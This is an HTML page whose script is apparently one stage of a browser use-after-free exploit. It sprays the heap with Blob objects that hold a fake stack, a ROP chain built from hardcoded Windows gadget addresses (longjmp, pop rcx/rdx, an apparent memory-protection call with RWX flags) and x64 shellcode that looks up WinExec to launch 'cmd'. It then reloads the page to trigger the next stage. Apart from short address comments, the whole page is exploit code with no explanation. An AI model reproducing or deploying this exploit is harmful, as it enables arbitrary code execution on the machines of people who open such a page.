<html>
<body>
<script>
//0x00007ffff1729000 ubuntu 18.04 glibc
/*
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

*/
//65F80 00007ffca146d000 winexec 7FFCA14D2F80
//00007ffc`a1552ae8 longjmp
//00007ffc`a15500de pop rcx ret
//00007ffc`a151066d pop rdx ret
//A00DE 6066D
var final_shellcode='\x99\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x48\x31\xdb\x48\x31\xf6\x8b\x5f\x3c\x48\x01\xfb\xb2\x88\x8b\x1c\x13\x48\x01\xfb\x8b\x73\x1c\x48\x01\xfe\x99\x66\xba\x27\x05\x8b\x04\x96\x48\x01\xf8\xeb\x17\x59\x99\x48\xff\xc2\xff\xd0\x99\x66\xba\x29\x01\x8b\x04\x96\x48\x01\xf8\x48\x31\xc9\xff\xd0\xe8\xe4\xff\xff\xff\x63\x6d\x64'
var pop0=0x00007ffca15500den;
var pop1=0x00007ffca151066dn;
var pop2=0x00007ffc9cecf4d7n;
var pop3=0x00007ffc9cd718a1n;
var heap_addr
async function step2(){
	var URL = document.URL;
	arr=URL.split("#");
	if(arr[arr.length-1]=="reload1")
		heap_addr=BigInt(arr[arr.length-2])
	else
		heap_addr=BigInt(arr[arr.length-1])
	console.log(heap_addr)
	let ab2 = new ArrayBuffer(0x1000*0x800);
	(new Uint8Array(ab2)).set(new Uint8Array(final_shellcode), 0x300);
	var pad = new BigUint64Array(ab2);
	
	for(let i=0;i<0x800;i++){
		var tmp=(heap_addr+0x20000000n)&(~0xfffn);
		var tmp1=tmp+0x100n;
		var tmp2=tmp+0x200n;
		var shellcode_addr=tmp+0x300n;
		pad[0x200*i+0-12]=(heap_addr+0x20000000n)&(~0xfffn);
		pad[0x200*i+1-12]=0x00007ffca1552ae8n; //long jmp
		pad[0x200*i+2-12]=tmp1; //new rsp
		pad[0x200*i+8-12]=(heap_addr+0x20000000n)&(~0xfffn);
		pad[0x200*i+10-12]=pop0; //new rip pop rcx ret
		pad[0x200*i+32-12]=tmp2;  //0x100
		pad[0x200*i+33-12]=pop1;
		pad[0x200*i+34-12]=0x0n; //0x110
		pad[0x200*i+35-12]=pop2;
		pad[0x200*i+36-12]=tmp2; //0x120
		pad[0x200*i+37-12]=pop3;
		pad[0x200*i+38-12]=pop0;
		pad[0x200*i+39-12]=tmp;
		pad[0x200*i+40-12]=pop1;
		pad[0x200*i+41-12]=0x1000n;
		pad[0x200*i+42-12]=pop2;
		pad[0x200*i+43-12]=0x40n;//00007ffc`a13cbc70
		pad[0x200*i+44-12]=0x00007ffca13cbc70n;
		pad[0x200*i+45-12]=shellcode_addr;
		pad[0x200*i+96-12]=0x8b4860428b486599n
		pad[0x200*i+97-12]=0xad4810708b481840n
		pad[0x200*i+98-12]=0x48307e8b48308b48n
		pad[0x200*i+99-12]=0x3c5f8bf63148db31n
		pad[0x200*i+100-12]=0x131c8b88b2fb0148n
		pad[0x200*i+101-12]=0x01481c738bfb0148n
		pad[0x200*i+102-12]=0x048b0527ba6699fen
		pad[0x200*i+103-12]=0x995917ebf8014896n
		pad[0x200*i+104-12]=0xba6699d0ffc2ff48n
		pad[0x200*i+105-12]=0xf8014896048b0129n
		pad[0x200*i+106-12]=0xffe4e8d0ffc93148n
		pad[0x200*i+107-12]=0x646d63ffffn
	}
	pad[0] = 0x22334455n;
	for(let i = 0; i < 180; i++){
		var a=new Blob([ab2]);

        }
	
	let ab11 = new ArrayBuffer(0x150);
        var uaf_ta1 = new BigUint64Array(ab11);
        uaf_ta1[0] = 0x55443322n;
        for(let j=1;j<35;j++){
            	uaf_ta1[j]=(heap_addr+0x20000000n)&(~0xfffn);
        }
	uaf_ta1[35]=0x0n;
	for(let i = 0; i < 0x5000; i++){
		var a=new Blob([ab11]);
        }
	for (var i=0; i< 1000000000; i++)
{
continue
}
	for (var i=0; i< 1000000000; i++)
{
continue
}
	for (var i=0; i< 1000000000; i++)
{
continue
}
	for (var i=0; i< 1000000000; i++)
{
continue
}
	for (var i=0; i< 1000000000; i++)
{
continue
}
	for (var i=0; i< 1000000000; i++)
{
continue
}
if (location.href.search("#reload1") == -1) {
        location.href = location.href + "#reload1";
        window.location.reload();
    }
}

if(step2()){
window.indexedDB.deleteDatabase("db1")
}
</script> 
</body>
</html>
